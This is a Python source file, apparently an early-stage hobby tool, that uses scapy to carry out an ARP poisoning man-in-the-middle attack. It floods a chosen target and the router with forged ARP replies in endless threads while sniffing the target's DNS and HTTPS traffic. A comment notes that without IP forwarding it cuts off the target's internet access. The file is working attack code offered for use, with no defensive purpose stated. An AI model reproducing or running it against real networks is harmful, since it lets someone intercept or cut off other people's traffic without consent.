from scapy.all import Ether, ARP, sendp, sniff
from host_gather import get_ip, device_scan
from random import randint
from scanner import process_packet
import threading

#This is still very much in its infancy, a lot more is to come.
#Currently, you need to have IP forwarding on for this to work.
#If you don't turn on IP forwarding, it'll still kind of work. You'll still successfully poison the ARP tables
#It's just...you won't be sending any of that info along to where it goes. So you're essentially cutting the internet off of whatever target you select.


def arp_poison(target_ip, router_ip, dst_mac, spoof_mac):
    ether_layer = Ether(dst=dst_mac)
    arp_layer = ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=spoof_mac)
    poison_packet = ether_layer/arp_layer
    print("Sending ARP packets to " + target_ip + "...")
    while(1):
        sendp(poison_packet, verbose=0)

def scan_function():
    capture = sniff(prn=process_packet, store=False, filter=f"not(src host {get_ip()} or dst host {get_ip()}) and (udp port 53 or tcp port 443)")


def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac):
    sniff_thread = threading.Thread(target=scan_function, daemon=True)
    print("Starting thread to poison target...")
    poison_device_thread = threading.Thread(target=arp_poison, args=(target_ip,router_ip,target_mac,attacker_mac), daemon=True)
    print("Starting thread to poison router...")
    poison_router_thread = threading.Thread(target=arp_poison, args=(router_ip, target_ip,router_mac, attacker_mac), daemon=True)
    poison_device_thread.start()
    poison_router_thread.start()
    sniff_thread.start()
